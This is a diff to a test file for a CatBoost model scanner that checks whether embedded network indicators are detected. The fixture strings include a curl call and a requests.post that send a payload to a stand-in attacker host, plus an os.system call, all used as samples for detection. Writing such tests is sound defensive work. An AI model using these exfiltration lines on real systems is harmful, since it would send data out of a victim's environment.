@@ -261,7 +261,7 @@ def test_whitelisted_catboost_downgrades_cross_fragment_correlation(tmp_path: Pa
             [
                 "metadata",
                 "os.system('echo benchmark')",
-                "callback=https://collector.evil.example/upload",
+                "curl https://collector.evil.example/upload",
             ],
         ),
     )
@@ -289,7 +289,7 @@ def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
         _build_cbm(
             [
                 "metadata",
-                "download_url=https://collector.evil.example/upload",
+                "requests.post('https://collector.evil.example/upload', data=payload)",
             ],
         ),
     )
@@ -303,16 +303,14 @@ def test_scan_detects_network_indicator_warning(tmp_path: Path) -> None:
 
 
 @pytest.mark.parametrize("indicator", ["8.8.8.8", "2001:4860:4860::8888"])
-def test_scan_detects_public_ip_network_indicators(tmp_path: Path, indicator: str) -> None:
+def test_scan_ignores_bare_public_ip_metadata(tmp_path: Path, indicator: str) -> None:
     model_path = tmp_path / "public_ip.cbm"
     model_path.write_bytes(_build_cbm([f"resolver={indicator}"]))
 
     result = CatBoostScanner().scan(str(model_path))
 
     network_check = next(check for check in result.checks if check.name == "Network Indicator Check")
-    assert network_check.status == CheckStatus.FAILED
-    assert network_check.severity == IssueSeverity.WARNING
-    assert indicator in str(network_check.details)
+    assert network_check.status == CheckStatus.PASSED
 
 
 @pytest.mark.parametrize(
